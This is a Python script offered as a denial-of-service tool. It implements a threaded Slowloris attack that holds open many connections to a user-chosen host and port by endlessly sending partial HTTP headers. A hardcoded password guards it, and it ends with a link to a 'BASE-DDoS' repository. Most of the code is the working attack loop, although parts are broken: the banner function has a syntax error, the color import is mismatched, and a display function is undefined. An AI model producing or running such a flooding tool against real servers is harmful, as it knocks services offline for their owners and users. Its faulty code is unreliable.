#!/usr/bin/python3
# -*- coding: utf-8  -*-
import os
import time
import socket
import getpass
import requests as r, os, threading, random, click, fake_headers
from threading import Thread
from colorama import Fade
from fake_headers import Headers

def clear(): 
	if os.name == 'nt': 
		os.system('cls') 
	else: 
		os.system('clear')

def logo()"""   
		
████▒▒     ██▒▒    ████▒▒    ██▒▒   ██████████▒▒
██▒██▒▒    ██▒▒ ██▒▒  ██▒▒  ██▒▒        ██▒▒████████▒▒   ████▒▒    ████▒▒    ████▒▒
██▒▒██▒▒   ██▒▒██▒▒     ██▒▒██▒▒        ██▒▒██▒▒        ██▒▒  ██▒▒  ██▒██▒  ██▒ ██▒▒      
██▒▒ ██▒▒  ██▒▒██▒▒     ██▒▒██▒▒        ██▒▒██▒▒       ██▒▒     ██▒▒██▒▒██ ██▒  ██▒▒
██▒▒  ██▒▒ ██▒▒██▒▒     ██▒▒██▒▒        ██▒▒██████▒▒  ██▒▒     ██▒▒██▒▒████▒▒  ██▒▒
██▒▒   ██▒▒██▒▒██▒▒     ██▒▒██▒▒        ██▒▒██▒▒      ██▒▒      ██▒▒██▒▒         ██▒▒
██▒▒    ██▒██▒▒██▒████▒██▒▒██▒▒        ██▒▒██▒▒       ██▒████▒▒██▒▒██▒▒         ██▒▒
██▒▒     ████▒▒██▒▒     ██▒▒██▒▒        ██▒▒████████▒▒██▒▒     ██▒▒██▒▒          ██▒▒033[0m/Base
\033[96m╔════════════════════════════════════════════════╗
\033[96m║\033[34m           BRIGADE ATTACKER SNIPER ELITE \033[96m║
\033[96m║\033[33m                  INTERNAL SCRIPT        \033[96m║
\033[96m║\033[32m                     By: KF'99           \033[96m║
\033[96m║\033[95m                      ——o0o——            \033[96m║
\033[96m╚════════════════════════════════════════════════
"""
faded_text = fade.fire(logo)
print(faded_text)
# Password authentication function
def authenticate():
    password = "bas3"  # The password to access the tool
    user_password = getpass.getpass(prompt="\033[1;36mEnter the password to access the tool: \033[0m")
    if user_password != password:
        print("\033[1;31mIncorrect password. Exiting...\033[0m")
        exit()
        
# Optimized Slowloris function with threading for faster execution
def slowloris_thread(target, port):
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target, port))
        s.send(f"GET /? HTTP/1.1\r\nHost: {target}\r\nUser-Agent: Mozilla/5.0\r\n".encode())

        # Faster loop to send partial headers
        while True:
            s.send(b"X-a: b\r\n")
            time.sleep(0.01)  # Further reduced delay to make it faster
    except socket.error:
        print("\033[1;31mConnection error. Could not send data.\033[0m")
        return

def slowloris(target, port, num_threads):
    for i in range(num_threads):
        thread = threading.Thread(target=slowloris_thread, args=(target, port))
        thread.start()
        print(f"\033[32mSTATUS  \033[97mATTACK  \033[92mSENT  \033[31m:{i + 1} \033[0m")
        print(f"\033[92mSTATUS  \033[33mATTACK  \033[92mSENT  \033[94m:{i + 1} \033[0m")
        print(f"\033[33mSTATUS  \033[96mATTACK  \033[94mSENT  \033[1m::{i + 1} \033[0m")
if __name__ == "__main__":
    clear()  
    # Clear the screen before showing anything
    ascii_art_Base()  # Display the colorful ASCII art for "Base"

    authenticate()  # Authenticate after displaying ASCII art

    target = input("\033[1;36mEnter the target IP or domain: \033[0m")
    port = int(input("\033[1;36mEnter the port number: \033[0m"))
    num_threads = int(input("\033[1;36mEnter the number of threads (more = faster): \033[0m"))

    slowloris(target, port, num_threads)

    print(f"\033[1;31mThank you for using my tool\033[0m")

    print(f"\033[1;31mmy github id: https://github.com/KunFay99/BASE-DDoS\033[0m")

    print(f"\033[1;31mpress ctrl + z\033[0m")

